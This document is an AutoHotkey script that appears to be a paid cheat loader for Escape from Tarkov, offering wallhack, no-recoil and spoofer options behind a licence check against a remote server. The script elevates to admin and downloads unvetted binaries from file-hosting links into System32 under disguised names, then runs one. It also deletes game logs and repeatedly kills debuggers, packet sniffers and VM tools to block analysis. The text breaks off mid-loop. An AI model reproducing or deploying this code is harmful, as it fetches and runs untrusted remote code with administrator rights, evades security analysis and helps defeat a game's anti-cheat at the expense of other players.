#NoEnv
#UseHook
#InstallMouseHook
#WinActivateForce
#NoTrayIcon
#SingleInstance ignore
SetBatchLines, -1
Global Srok
SendMode Input
if not A_IsAdmin{
try {
Run *RunAs "%A_ScriptFullPath%"
}
Catch, e {
MsgBox,, Error ÐžÑˆÐ¸Ð±ÐºÐ°, This software Requires Admin priveledge.`nÐ­Ñ‚Ð¾Ð¼Ñƒ ÐŸÐž Ð½ÐµÐ¾Ð±Ñ…Ð¾Ð´Ð¸Ð¼Ñ‹ Ð¿Ñ€Ð°Ð²Ð° ÐÐ´Ð¼Ð¸Ð½Ð¸ÑÑ‚Ñ€Ð°Ñ‚Ð¾Ñ€Ð°., 5
}
ExitApp
}
RegSearchTarget = \EscapeFromTarkov.exe
Gosub, RegSearch
pass:= EFTDir
Global pass
Gosub, Nachalo
return
RegSearch:
ContinueRegSearch = y
Loop, HKEY_CURRENT_USER, , 1, 1
{
Gosub, CheckThisRegItem
if ContinueRegSearch = n
return
}
return
CheckThisRegItem:
if A_LoopRegType = KEY
return
RegRead, RegValue
if ErrorLevel
return
IfInString, RegValue, %RegSearchTarget%
{
FullFileName = %RegValue%
SplitPath, FullFileName,, EFTDir,,, WhereDir
If (WhereDir <> "")
if ErrorLevel = 0
ContinueRegSearch = n
}
return
Nachalo:
RegRead, licenseKey, HKEY_LOCAL_MACHINE, SYSTEM\CurrentControlSet\Control, licenseKey
check3("https://pastebin.com/raw/pRW2M3WV")
check3(link)    {
oWhr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
oWhr.Open("GET", link, false)
oWhr.Send()
News:= oWhr.ResponseText
msgbox,48,Today news///Ð¡ÐµÐ³Ð¾Ð´Ð½ÑÑˆÐ½Ð¸Ðµ Ð½Ð¾Ð²Ð¾ÑÑ‚Ð¸, %News%
}
global News
SetWorkingDir %A_ScriptDir%
UrlDownloadToFile, https://ecstacy.space/Untitled.jpg, C:\Windows\BigTOS.jpg
Gaystack := "7dd6c79dd8ba016b1f73b7bbfd77 1e1ef75f979bbdbe0a5e8c483c78 fbf296e5aa774e12d1b16c7e7687 d19cbc472227d1e3d1d276c2cbc0 8726e36e9d6d53646390d495 d41d8cd98f00b204e98009 992df1d2d0a0f90a183a8c 73acd9a5972130b75066c8"
RegRead, DriveNumber1, HKEY_LOCAL_MACHINE, SYSTEM\CurrentControlSet\Control\ComputerName\ActiveComputerNames, ComputerNamer
DriveNumber := MD5(DriveNumber1)
If (DriveNumber1 = "")
{
RegRead, DriveNumber2, HKEY_LOCAL_MACHINE, SYSTEM\CurrentControlSet\Control\ComputerName\ActiveComputerName, ComputerName
If (DriveNumber2 = "")
{
DriveNumber2 = "MyComputer"
}
Random, random_name, 1000, 9999
solva = %DriveNumber2%%random_name%
RegWrite, REG_SZ, HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ComputerName\ActiveComputerNames, ComputerNamer, %solva%
RegRead, DriveNumber3, HKEY_LOCAL_MACHINE, SYSTEM\CurrentControlSet\Control\ComputerName\ActiveComputerNames, ComputerNamer
DriveNumber := MD5(DriveNumber3)
}
Gui, Add, Picture, x-0 y-0 w491 h350 , C:\Windows\BigTOS.jpg
Gui, Color, cGreen
Gui, Font, S28 Bold, Verdana
Gui, -Caption +Toolwindow
Gui, Add, Button, x162 y249 w160 h60 gDoAllShit, Start!
Gui, Font, S20 w1000, Arial
Gui, Add, Text, x70 y0 Center cYellow +BackgroundTrans, Enter your license key:
Gui, Font, S15 Bold, Verdana
Gui, Add, Edit, x22 y30 w380 h40 Center vEdit,%licenseKey%
Gui, Font, S12 w1000, Arial
Gui, Add, Button, x412 y30 w80 h40, Confirm
Gui, Font, S20 w1000, Arial
Gui, Add, CheckBox, x690 y80 w12 h12 vskill_1
Gui, Add, Text, x605 y71 w110 h30 cYellow +BackgroundTrans, Spoofer
Gui, Add, CheckBox, x50 y150 w12 h12 vskill_2
Gui, Add, Text, x65 y141 w120 h30 cYellow +BackgroundTrans, NoRecoil
Gui, Add, CheckBox, x50 y180 w12 h12 vskill_3
Gui, Add, Text, x65 y171 w130 h30 cYellow +BackgroundTrans, BigHeads
Gui, Add, CheckBox, x825 y80 w12 h12 vskill_4
Gui, Add, Text, x840 y71 w110 h30 cYellow +BackgroundTrans, M2
Gui, Add, CheckBox, x50 y210 w12 h12 vskill_5
Gui, Add, Text, x65 y201 w110 h30 cYellow +BackgroundTrans, Items
Gui, Add, Text, x65 y81 w150 h30 cYellow +BackgroundTrans, WH Full
Gui, Add, Text, x65 y111 w150 h30 cYellow +BackgroundTrans, WH Tran
Gui, Add, Radio, x50 y90 w12 h12 gCheck vRadioGroup1,
Gui, Add, Radio, x50 y120 w12 h12 gCheck vRadioGroup2,
Gui, Font, S14 w1000, Arial
Gui, Add, Button, x420 y300 w70 h20 gReset, Reset!
Gui, Add, Button, x1 y300 w70 h20 gLeave, Exit!
Gui, Add, Button, x390 y278 w100 h20 gNew, Contact!
Gui, Add, Button, x1 y278 w120 h20 gInstruction, Website!
Gui, Add, Button, x1 y256 w120 h20 gExpiry, Expiry
Gui, Show, x613 y212 h321 w491,
Return
Return
GuiClose:
Gui, %A_Gui%: Show, Hide
FileDelete, C:\Windows\BigTOS.jpg
SplashTextOn , 300, 100, See you soon!!!, You look nice today <3`nCome again:)`n`nÐ’Ñ‹ ÑÐµÐ³Ð¾Ð´Ð½Ñ Ñ…Ð¾Ñ€Ð¾ÑˆÐ¸ ÐºÐ°Ðº Ð½Ð¸ÐºÐ¾Ð³Ð´Ð° <3`nÐ—Ð°Ñ…Ð¾Ð´Ð¸Ñ‚Ðµ ÐµÑ‰Ñ‘:)
Sleep, 5000
SplashTextOff
ExitApp
ButtonConfirm:
GuiControlGet, Edit
licenseKey = %Edit%
RegWrite, REG_SZ, HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control,licenseKey,%Edit%
Return
Return
DoAllShit:
global licenseKey
conntries = 0
loop, 6
Try {
HTTP := ComObjCreate("WinHTTP.WinHTTPRequest.5.1")
HTTP.Open("POST", "http://awo.erqt.ru/klin/index.php", true)
HTTP.SetRequestHeader("Content-Type", "application/x-www-form-urlencoded")
HTTP.SetRequestHeader("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko)")
HTTP.SetRequestHeader("Pragma", "no-cache")
HTTP.SetRequestHeader("Cache-Control", "no-cache, no-store")
HTTP.SetRequestHeader("If-Modified-Since", "Sat, 1 Jan 2000 00:00:00 GMT")
HTTP.Send("&key=" licenseKey "&hwid=" DriveNumber)
HTTP.WaitForResponse()
Response:= cfcd208495d565ef66e7dff9f98764da
Break
} Catch, e {
Sleep, 3000
conntries = conntries + 1
If (conntries>4)
MsgBox, ÐžÑˆÐ¸Ð±ÐºÐ° Ð¿Ñ€Ð¸ ÑÐ²ÑÐ·Ð¸ Ñ ÑÐµÑ€Ð²ÐµÑ€Ð¾Ð¼`n Error while connecting to server.`n`n %e%
ExitApp
}
RespArray := StrSplit(Response, " ")
Response := RespArray[1]
If (RespArray.Length()==2)
Timeout := RespArray[2]
FirstTime:=0
IfInString, Response, cfcd208495d565ef66e7dff9f98764da
{
FirstTime:=1
MsgBox,16,, Thanks for buying our software!`n`nÐ¡Ð¿Ð°ÑÐ¸Ð±Ð¾ Ð·Ð° Ð¿Ñ€Ð¸Ð¾Ð±Ñ€ÐµÑ‚ÐµÐ½Ð¸Ðµ Ð½Ð°ÑˆÐµÐ³Ð¾ ÑÐ¾Ñ„Ñ‚Ð°!
}
IfInString, Response, 5d6bb61e3b7bce0931da574d19d1d82c88
{
NotInList := 1
MsgBox,16,, Your app is not Activated'nContact the seller`n`nÐ’Ð°ÑˆÐµ Ð¿Ñ€Ð¸Ð»Ð¾Ð¶ÐµÐ½Ð¸Ðµ Ð½Ðµ ÐÐºÑ‚Ð¸Ð²Ð¸Ñ€Ð¾Ð²Ð°Ð½Ð½Ð¾'nÐ¡Ð²ÑÐ¶Ð¸Ñ‚ÐµÑÑŒ Ñ Ð¿Ñ€Ð¾Ð´Ð°Ð²Ñ†Ð¾Ð¼
ExitApp
}
IfInString, Response, 6bb61e3b7bce0931da574d19d1d82c88
{
NotInList := 1
MsgBox,16,, Your app is not Activated'nContact the seller`n`nÐ’Ð°ÑˆÐµ Ð¿Ñ€Ð¸Ð»Ð¾Ð¶ÐµÐ½Ð¸Ðµ Ð½Ðµ ÐÐºÑ‚Ð¸Ð²Ð¸Ñ€Ð¾Ð²Ð°Ð½Ð½Ð¾'nÐ¡Ð²ÑÐ¶Ð¸Ñ‚ÐµÑÑŒ Ñ Ð¿Ñ€Ð¾Ð´Ð°Ð²Ñ†Ð¾Ð¼
ExitApp
}
IfInString, Response, 5d7b9adcbe1c629ec722529dd12e5129
{
NotInList := 1
MsgBox,16,, Your app is not Activated'nContact the seller`n`nÐ’Ð°ÑˆÐµ Ð¿Ñ€Ð¸Ð»Ð¾Ð¶ÐµÐ½Ð¸Ðµ Ð½Ðµ ÐÐºÑ‚Ð¸Ð²Ð¸Ñ€Ð¾Ð²Ð°Ð½Ð½Ð¾'nÐ¡Ð²ÑÐ¶Ð¸Ñ‚ÐµÑÑŒ Ñ Ð¿Ñ€Ð¾Ð´Ð°Ð²Ñ†Ð¾Ð¼
ExitApp
}
IfInString, Response, b3149ecea4628efd23d2f86e5a723472
{
Expired := 1
MsgBox,16,, Your license expired'nContact the seFller`n`nÐ¡Ñ€Ð¾Ðº Ð´ÐµÐ¹ÑÑ‚Ð²Ð¸Ñ Ð¸ÑÑ‚ÐµÐº'nÐ¡Ð²ÑÐ¶Ð¸Ñ‚ÐµÑÑŒ Ñ Ð¿Ñ€Ð¾Ð´Ð°Ð²Ñ†Ð¾Ð¼
ExitApp
}
IfInString, Response, 0267aaf632e87a63288a08331f22c7c3
{
HwidIncorrect := 1
MsgBox,16,, An attempt to use a license on a different PC.`n Contact the seller`n`nÐŸÐ¾Ð¿Ñ‹Ñ‚ÐºÐ° Ð¸ÑÐ¿Ð¾Ð»ÑŒÐ·Ð¾Ð²Ð°Ñ‚ÑŒ Ð»Ð¸Ñ†ÐµÐ½Ð·Ð¸ÑŽ Ð½Ð° Ð´Ñ€ÑƒÐ³Ð¾Ð¼ ÐŸÐš.`nÐ¡Ð²ÑÐ¶Ð¸Ñ‚ÐµÑÑŒ Ñ Ð¿Ñ€Ð¾Ð´Ð°Ð²Ñ†Ð¾Ð¼.
ExitApp
}
IfInString, Response, asd87f89asd7fgjsdfg7y8j9sdf
{
Locked := 1
MsgBox,16,, An attempt to use a revoked license`n Contact the seller`n`nÐŸÐ¾Ð¿Ñ‹Ñ‚ÐºÐ° Ð¸ÑÐ¿Ð¾Ð»ÑŒÐ·Ð¾Ð²Ð°Ñ‚ÑŒ Ð¾Ñ‚Ð¾Ð·Ð²Ð°Ð½Ð½ÑƒÑŽ Ð»Ð¸Ñ†ÐµÐ½Ð·Ð¸ÑŽ.`nÐ¡Ð²ÑÐ¶Ð¸Ñ‚ÐµÑÑŒ Ñ Ð¿Ñ€Ð¾Ð´Ð°Ð²Ñ†Ð¾Ð¼.
ExitApp
}
IfInString, Response, 91387b9f5fda4804f85672e1a300eca9
{
Locked := 1
MsgBox,16,, Licensing error. Contact the seller.`n Internal error ID: 256923`n`nÐžÑˆÐ¸Ð±ÐºÐ° Ð»Ð¸Ñ†ÐµÐ½Ð·Ð¸Ñ€Ð¾Ð²Ð°Ð½Ð¸Ñ. Ð¡Ð²ÑÐ¶Ð¸Ñ‚ÐµÑÑŒ Ñ Ð¿Ñ€Ð¾Ð´Ð°Ð²Ñ†Ð¾Ð¼.`nÐ’Ð½ÑƒÑ‚Ñ€ÐµÐ½Ð½Ð¸Ð¹ ID Ð¾ÑˆÐ¸Ð±ÐºÐ¸: 256923
ExitApp
}
If (FirstTime != 1){
MsgBox,,, ÐšÐ»ÑŽÑ‡ Ð¸ÑÑ‚ÐµÐºÐ°ÐµÑ‚ %Timeout%`nKey expires on %Timeout%, 3
}
Gui, %A_Gui%: Show, Hide
FileDelete, C:\Windows\BigTOS.jpg
GuicontrolGet,skill_4
if skill_4 = 0
{
Fraze := "|Debug|application|TRACE-NetworkGameMatching G"
Random, SataRand, 50, 100
Random, M2Rand, 0, 0
}
if skill_4 = 1
{
Fraze := "|Debug|application|Matching with group id"
Random, SataRand, 0, 0
Random, M2Rand, 400, 450
}
global Fraze
global SataRand
global M2Rand
global RadioGroup
GuicontrolGet,skill_2
GuicontrolGet,skill_3
if (skill_2 = 0) and (skill_3 = 1)
{
MsgBox,16,, Heads only with no-recoil!`n`nÐ“Ð¾Ð»Ð¾Ð²Ñ‹ Ñ‚Ð¾Ð»ÑŒÐºÐ¾ Ñ Ð½ÐµÑ‚-Ð¾Ñ‚Ð´Ð°Ñ‡Ð¸!
ExitApp
}
GuicontrolGet,skill_5
GuicontrolGet,skill_6
if (skill_5 = 0) and (skill_6 = 1)
{
MsgBox,16,, Bigloot only with loot!`n`nÐ‘Ð¾Ð»ÑŒÑˆÐ¾Ð¹ Ð»ÑƒÑ‚ Ñ‚Ð¾Ð»ÑŒÐºÐ¾ Ð²Ð¼ÐµÑÑ‚Ðµ Ñ Ð»ÑƒÑ‚!
ExitApp
}
Needle:= DriveNumber
global aboba
global aboba2
global Needle
global Sapp
aboba = 0
aboba2 = 0
if skill_1 = 1
{
IfNotExist, C:\Windows\System32\sloppa.dll
{
UrlDownloadToFile, https://www.4sync.com/web/directDownload/yvZlnR61/iOV04da5.0ba73eca57281d4fd01f033c32355dc8, C:\Windows\System32\sloppa.dll
}
OnError("SpoofBug")
FileCopy, C:\Windows\System32\sloppa.dll, C:\Users\Default\spoof.exe, 1
Run, spoof.exe, C:\Users\Default, max
}
FileAppend, %Sapp%, C:\Users\Default\123.txt
Loop, read, C:\Users\Default\123.txt, C:\Users\Default\234.txt
{
IfInString, A_LoopReadLine, %Needle%, FileAppend, %A_LoopReadLine%`n
}
FileMove, C:\Users\Default\234.txt, C:\Users\Default\123.txt, 1
Loop, read, C:\Users\Default\123.txt
last_line := A_LoopReadLine
FirstDate:= last_line
FileDelete, C:\Users\Default\123.txt
OnExit("IrregExit")
IfNotExist, C:\EFTpath.txt
{
IfNotExist, %pass%\EscapeFromTarkov_Data\StreamingAssets\Windows\cubemaps.
{
InputBox, Pass, ÐŸÑƒÑ‚ÑŒ Ðº Ð¸Ð³Ñ€Ðµ/Game Path,Ð’Ð²ÐµÐ´Ð¸Ñ‚Ðµ ÑÐ²Ð¾Ð¹ ÐŸÑƒÑ‚ÑŒ Ðº Ð˜Ð³Ñ€Ðµ (ÐºÐ°Ðº Ð½Ð° Ð¿Ñ€Ð¸Ð¼ÐµÑ€Ðµ)`nEnter Game Path (as in the example),,300,150,,,,,C:\Battlestate Games\EFT
FileAppend, %Pass%, C:\EFTpath.txt
}
}
IfExist, C:\EFTpath.txt
{
Loop, read, C:\EFTpath.txt
last_line := A_LoopReadLine
Pass:= last_line
Global Pass
IfNotExist, %Pass%\EscapeFromTarkov_Data\StreamingAssets\Windows\cubemaps.
{
MsgBox,16,, ATTENTION! Invalid game path specified!`n Cheat CLOSED! Run and Reset!`n`nÐ’ÐÐ˜ÐœÐÐÐ˜Ð•! Ð£ÐºÐ°Ð·Ð°Ð½ Ð½ÐµÐ²ÐµÑ€Ð½Ñ‹Ð¹ Ð¿ÑƒÑ‚ÑŒ Ðº Ð¸Ð³Ñ€Ðµ!`n`n Ð—ÐÐšÐ Ð«Ð¢Ð˜Ð• Ð§Ð˜Ð¢Ð! ÐŸÐµÑ€ÐµÐ·Ð°Ð¿ÑƒÑÑ‚Ð¸Ñ‚Ðµ Ð¸ Ð½Ð°Ð¶Ð¼Ð¸Ñ‚Ðµ Reset!
ExitApp
}
}
banlist := ["totalcmd.exe","httpanalyzer.exe", "ollydbg.exe", "ProcessHacker.exe", "tcpview.exe", "autoruns.exe", "filemon.exe", "procmon.exe", "procmon64.exe",  "idaq.exe", "idaq64.exe", "ImmunityDebugger.exe", "Wireshark.exe", "dumpcap.exe", "HookExplorer.exe", "ImportREC.exe", "PETools.exe", "LordPE.exe", "dumpcap.exe", "SysInspector.exe", "proc_analyzer.exe", "sysAnalyzer.exe", "sniff_hit.exe", "windbg.exe", "joeboxcontrol.exe", "Fiddler.exe", "joeboxserver.exe", "ida64.exe", "ida.exe", "Vmtoolsd.exe", "Vmwaretrat.exe", "Vmwareuser.exe", "Vmacthlp.exe", "vboxservice.exe", "vboxtray.exe", "KsDumper.exe", "x64dbg.exe", "OLLYDBG.exe", "httpdebuger.exe", "ReClass.NET.exe"]
for i,el in banlist
{
p := banlist[A_Index]
Process, Exist, %p%
if(ErrorLevel != 0) {
Process, Close, %p%
}
}
If Srok > 0
MsgBox, 64, Important information, Remaining %Left% days of subscription`nCan Play!`n`nÐžÑÑ‚Ð°Ð»Ð¾ÑÑŒ %Left% Ð´Ð½ÐµÐ¹ Ð¿Ð¾Ð´Ð¿Ð¸ÑÐºÐ¸`nÐœÐ¾Ð¶ÐµÑ‚Ðµ Ð¸Ð³Ñ€Ð°Ñ‚ÑŒ!
else	{
MsgBox, 64, Important information, Can Play!`n`nÐœÐ¾Ð¶ÐµÑ‚Ðµ Ð¸Ð³Ñ€Ð°Ñ‚ÑŒ!
}
IfExist, C:\Users\Default\AppData\Roaming\posthead
{
MsgBox,16,, Did not press "Reset" = ban!`n`nÐÐµ Ð½Ð°Ð¶Ð°Ð»Ð¸ "Reset" = Ð±Ð°Ð½!
ExitApp
}
Folder = %pass%\Logs
Loop, %Folder%\*, 2
FileDelete, %A_LoopFileLongPath%\*.log
Process, Wait, EscapeFromTarkov.exe, 200
NewPID = %ErrorLevel%
if NewPID = 0
{
msgbox,16,, Closing the cheat due to inactivity!`n`nÐ—Ð°ÐºÑ€Ñ‹Ñ‚Ð¸Ðµ Ñ‡Ð¸Ñ‚Ð° Ð¸Ð·-Ð·Ð° Ð½ÐµÐ°ÐºÑ‚Ð¸Ð²Ð½Ð¾ÑÑ‚Ð¸!
ExitApp
}
banlist := ["totalcmd.exe","httpanalyzer.exe", "ollydbg.exe", "ProcessHacker.exe", "tcpview.exe", "autoruns.exe", "filemon.exe", "procmon.exe", "procmon64.exe",  "idaq.exe", "idaq64.exe", "ImmunityDebugger.exe", "Wireshark.exe", "dumpcap.exe", "HookExplorer.exe", "ImportREC.exe", "PETools.exe", "LordPE.exe", "dumpcap.exe", "SysInspector.exe", "proc_analyzer.exe", "sysAnalyzer.exe", "sniff_hit.exe", "windbg.exe", "joeboxcontrol.exe", "Fiddler.exe", "joeboxserver.exe", "ida64.exe", "ida.exe", "Vmtoolsd.exe", "Vmwaretrat.exe", "Vmwareuser.exe", "Vmacthlp.exe", "vboxservice.exe", "vboxtray.exe", "KsDumper.exe", "x64dbg.exe", "OLLYDBG.exe", "httpdebuger.exe", "ReClass.NET.exe"]
for i,el in banlist
{
p := banlist[A_Index]
Process, Exist, %p%
if(ErrorLevel != 0) {
Process, Close, %p%
}
}
Loop, 200
{
If !ProcessExist("EscapeFromTarkov.exe")
ExitApp
If SIZEHi >= 0
Break
Loop, %pass%\Logs\*backend.log,, 1
{
SIZEHi := A_LoopFileSize
If A_LoopFileSize >= 0
Break
}
Sleep, 500
}
Sleep, 10000
GuicontrolGet,skill_2
GuicontrolGet,skill_3
if (skill_2 = 1) and (skill_3 = 0)
{
RecLink = https://www.4sync.com/web/directDownload/QWEbEWdk/zupGP2AL.0b1f774bdbf2e4938874430129e948fa
}
if (skill_2 = 1) and (skill_3 = 1)
{
RecLink = https://www.4sync.com/web/directDownload/RKmb7Vtb/zupGP2AL.d3b003cea7fcb456a0e3a0fddd70d8d2
}
GuicontrolGet,skill_5
if skill_5 = 1
{
LootLink = https://drive.google.com/uc?export=download&confirm=no_antivirus&id=1TixxMp9uRK8H6FGoDEvo8pfACQ6q8-9R
ReservL = https://drive.google.com/uc?export=download&confirm=no_antivirus&id=1TixxMp9uRK8H6FGoDEvo8pfACQ6q8-9R
LootSave = C:\Windows\System32\Pipa.dll
}
if RadioGroup = 1
{
NewLink = https://drive.google.com/uc?export=download&confirm=no_antivirus&id=1UtzGPXwxQiArXlBsXF0G4muyvzAANjEn
ReservL = https://github.com/blackkoby/kobyblack/releases/download/tile/FE.dll
LoadSave = C:\Windows\System32\Vasta.dll
}
if RadioGroup = 2
{
NewLink = https://drive.google.com/uc?export=download&confirm=no_antivirus&id=18CgsVOzkliSTs6i5VnmNr1MnaTqKJrxv
ReservL = https://github.com/blackkoby/kobyblack/releases/download/tile/TE.dll
LoadSave = C:\Windows\System32\Micropov.dll
}
Global RecLink
Global NewLink
Global LoadSave
Global LootSave
Global ReservL
GuicontrolGet,skill_2
if (skill_2 = 0) and (RadioGroup > 0)
{
hk(1)
FileDelete, %Pass%\cache\*.*
FileCreateDir, C:\Users\Default\6.2
FileSetAttrib, +H, C:\Users\Default\6.2
ZapuskGame = C:\Users\Default\6.2
ZapuskPath = C:\Users\Default\123.zip
FileCreateDir, C:\Windows\headpost
FileCreateDir, C:\Users\Default\AppData\Roaming\posthead
FileCopyDir, %Pass%\EscapeFromTarkov_Data\StreamingAssets\Windows\assets\content\characters\character\prefabs, C:\Windows\headpost, 1
FileCopyDir, %Pass%\EscapeFromTarkov_Data\StreamingAssets\Windows\assets\content\characters\character\prefabs, C:\Users\Default\AppData\Roaming\posthead, 1
IfNotExist, %LoadSave%
{
UrlDownloadToFile, %NewLink%, %LoadSave%
FileGetSize, ArcSize, %LoadSave%
If (ArcSize < 200000)
{
FileDelete, %LoadSave%
UrlDownloadToFile, %ReservL%, %LoadSave%
}
FileGetSize, ArcSize2, %LoadSave%
If (ArcSize2 < 200000)
{
hk(0)
msgbox,16,, This version isn't available at the moment`nOr you have internet problems! Contact with seller!`n`nÐ”Ð°Ð½Ð½Ð°Ñ Ð²ÐµÑ€ÑÐ¸Ñ Ð½ÐµÐ´Ð¾ÑÑ‚ÑƒÐ¿Ð½Ð° Ð² Ð´Ð°Ð½Ð½Ñ‹Ð¹ Ð¼Ð¾Ð¼ÐµÐ½Ñ‚`nÐ˜Ð»Ð¸ Ñƒ Ð²Ð°Ñ Ð¿Ñ€Ð¾Ð±Ð»ÐµÐ¼Ñ‹ Ñ Ð¸Ð½Ñ‚ÐµÑ€Ð½ÐµÑ‚Ð¾Ð¼! Ð¡Ð²ÑÐ¶Ð¸Ñ‚ÐµÑÑŒ Ñ Ð¿Ñ€Ð¾Ð´Ð°Ð²Ñ†Ð¾Ð¼!
ExitApp
}
}
FileCopy, %LoadSave%, %ZapuskPath%
RunWait PowerShell.exe -Command Expand-Archive -LiteralPath '%ZapuskPath%' -DestinationPath '%ZapuskGame%' -Force,, Hide
FileDelete, %ZapuskPath%
if skill_5 = 1
{
FileCreateDir, C:\Users\Default\7.2
FileSetAttrib, +H, C:\Users\Default\7.2
LootGame = C:\Users\Default\7.2
LootPath = C:\Users\Default\234.zip
FileCreateDir, C:\Windows\plootes
FileCreateDir, C:\Windows\plootes\barter
FileCreateDir, C:\Windows\plootes\containers
FileCreateDir, C:\Windows\plootes\food
FileCreateDir, C:\Windows\plootes\infosubject
FileCreateDir, C:\Windows\plootes\spec
FileCopyDir, %Pass%\EscapeFromTarkov_Data\StreamingAssets\Windows\assets\content\items\barter, C:\Windows\plootes\barter, 1
FileCopyDir, %Pass%\EscapeFromTarkov_Data\StreamingAssets\Windows\assets\content\items\containers, C:\Windows\plootes\containers, 1
FileCopyDir, %Pass%\EscapeFromTarkov_Data\StreamingAssets\Windows\assets\content\items\food, C:\Windows\plootes\food, 1
FileCopyDir, %Pass%\EscapeFromTarkov_Data\StreamingAssets\Windows\assets\content\items\infosubject, C:\Windows\plootes\infosubject, 1
FileCopyDir, %Pass%\EscapeFromTarkov_Data\StreamingAssets\Windows\assets\content\items\spec, C:\Windows\plootes\spec, 1
FileCreateDir, C:\Users\Default\AppData\Roaming\postlet
FileCreateDir, C:\Users\Default\AppData\Roaming\postlet\barter
FileCreateDir, C:\Users\Default\AppData\Roaming\postlet\containers
FileCreateDir, C:\Users\Default\AppData\Roaming\postlet\food
FileCreateDir, C:\Users\Default\AppData\Roaming\postlet\infosubject
FileCreateDir, C:\Users\Default\AppData\Roaming\postlet\spec
FileCopyDir, %Pass%\EscapeFromTarkov_Data\StreamingAssets\Windows\assets\content\items\barter, C:\Users\Default\AppData\Roaming\postlet\barter, 1
FileCopyDir, %Pass%\EscapeFromTarkov_Data\StreamingAssets\Windows\assets\content\items\containers, C:\Users\Default\AppData\Roaming\postlet\containers, 1
FileCopyDir, %Pass%\EscapeFromTarkov_Data\StreamingAssets\Windows\assets\content\items\food, C:\Users\Default\AppData\Roaming\postlet\food, 1
FileCopyDir, %Pass%\EscapeFromTarkov_Data\StreamingAssets\Windows\assets\content\items\infosubject, C:\Users\Default\AppData\Roaming\postlet\infosubject, 1
FileCopyDir, %Pass%\EscapeFromTarkov_Data\StreamingAssets\Windows\assets\content\items\spec, C:\Users\Default\AppData\Roaming\postlet\spec, 1
IfNotExist, %LootSave%
{
UrlDownloadToFile, %LootLink%, %LootSave%
FileGetSize, ArcSize, %LootSave%
If (ArcSize < 40000)
{
FileDelete, %LootSave%
UrlDownloadToFile, %ReservL%, %LootSave%
}
FileGetSize, ArcSize2, %LootSave%
If (ArcSize2 < 40000)
{
hk(0)
BlockInput MouseMoveOff
msgbox, LooThis version isn't available at the moment`nOr you have internet problems! Contact with seller!`n`nÐ”Ð°Ð½Ð½Ð°Ñ Ð²ÐµÑ€ÑÐ¸Ñ Ð½ÐµÐ´Ð¾ÑÑ‚ÑƒÐ¿Ð½Ð° Ð² Ð´Ð°Ð½Ð½Ñ‹Ð¹ Ð¼Ð¾Ð¼ÐµÐ½Ñ‚`nÐ˜Ð»Ð¸ Ñƒ Ð²Ð°Ñ Ð¿Ñ€Ð¾Ð±Ð»ÐµÐ¼Ñ‹ Ñ Ð¸Ð½Ñ‚ÐµÑ€Ð½ÐµÑ‚Ð¾Ð¼! Ð¡Ð²ÑÐ¶Ð¸Ñ‚ÐµÑÑŒ Ñ Ð¿Ñ€Ð¾Ð´Ð°Ð²Ñ†Ð¾Ð¼!
ExitApp
}
}
FileCopy, %LootSave%, %LootPath%
RunWait PowerShell.exe -Command Expand-Archive -LiteralPath '%LootPath%' -DestinationPath '%LootGame%' -Force,, Hide
FileDelete, %LootPath%
}
SplashTextOn , 400, 80, , Now you can play! Have fun!`n`nÐ¢ÐµÐ¿ÐµÑ€ÑŒ Ð¼Ð¾Ð¶Ð½Ð¾ Ð¸Ð³Ñ€Ð°Ñ‚ÑŒ! ÐŸÐ¾Ð²ÐµÑÐµÐ»Ð¸Ñ‚ÐµÑÑŒ!
Sleep, 5000
SplashTextOff
loop,
{
banlist := ["totalcmd.exe","httpanalyzer.exe", "ollydbg.exe", "ProcessHacker.exe", "tcpview.exe", "autoruns.exe", "filemon.exe", "procmon.exe", "procmon64.exe",  "idaq.exe", "idaq64.exe", "ImmunityDebugger.exe", "Wireshark.exe", "dumpcap.exe", "HookExplorer.exe", "ImportREC.exe", "PETools.exe", "LordPE.exe", "dumpcap.exe", "SysInspector.exe", "proc_analyzer.exe", "sysAnalyzer.exe", "sniff_hit.exe", "windbg.exe", "joeboxcontrol.exe", "Fiddler.exe", "joeboxserver.exe", "ida64.exe", "ida.exe", "Vmtoolsd.exe", "Vmwaretrat.exe", "Vmwareuser.exe", "Vmacthlp.exe", "vboxservice.exe", "vboxtray.exe", "KsDumper.exe", "x64dbg.exe", "OLLYDBG.exe", "httpdebuger.exe", "ReClass.NET.exe"]
for i,el in banlist
{
p := banlist[A_Index]
Process, Exist, %p%
if(ErrorLevel != 0) {
Process, Close, %p%
}
}
hk(0)
BlockInput MouseMoveOff
FolderSize = 0
WhichFolder = C:\Users\Default\6.2\new
Loop, %WhichFolder%\*.*, , 1
FolderSize += %A_LoopFileSize%
If (FolderSize < 200000000)
{
msgbox,16,, Oh This version isn't available at the moment`nOr you have internet problems! Contact with seller!`n`nÐžÐ¹ Ð”Ð°Ð½Ð½Ð°Ñ Ð²ÐµÑ€ÑÐ¸Ñ Ð½ÐµÐ´Ð¾ÑÑ‚ÑƒÐ¿Ð½Ð° Ð² Ð´Ð°Ð½Ð½Ñ‹Ð¹ Ð¼Ð¾Ð¼ÐµÐ½Ñ‚`nÐ˜Ð»Ð¸ Ñƒ Ð²Ð°Ñ Ð¿Ñ€Ð¾Ð±Ð»ÐµÐ¼Ñ‹ Ñ Ð¸Ð½Ñ‚ÐµÑ€Ð½ÐµÑ‚Ð¾Ð¼! Ð¡Ð²ÑÐ¶Ð¸Ñ‚ÐµÑÑŒ Ñ Ð¿Ñ€Ð¾Ð´Ð°Ð²Ñ†Ð¾Ð¼!
ExitApp
}
Loop, %pass%\Logs\*application.log,, 1
{
AppPath := A_LoopFileFullPath
loop, 10
{
loop, 1
{
FileRead, Gcount, %AppPath%
StringReplace, Gcount, Gcount, %Fraze%, %Fraze%, UseErrorLevel
Cent1 := ErrorLevel
}
}
}
global Cent1
hk(0)
BlockInput MouseMoveOff
Loop, %pass%\Logs\*application.log,, 1
{
AppPath := A_LoopFileFullPath
loop, 10
{
loop, 1
{
FileRead, cancelcount, %AppPath%
StringReplace, cancelcount, cancelcount, |Network game matching cancelled, |Network game matching cancelled, UseErrorLevel
Cent2 := ErrorLevel
}
}
}
global Cent2
Loop, %pass%\Logs\*application.log,, 1
{
AppPath := A_LoopFileFullPath
loop, 10
{
loop, 1
{
FileRead, netcount, %AppPath%
StringReplace, netcount, netcount, |TRACE-NetworkGameCreate 6, |TRACE-NetworkGameCreate 6, UseErrorLevel
Cent3 := ErrorLevel
}
}
}
global Cent3
Loop, %pass%\Logs\*application.log,, 1
{
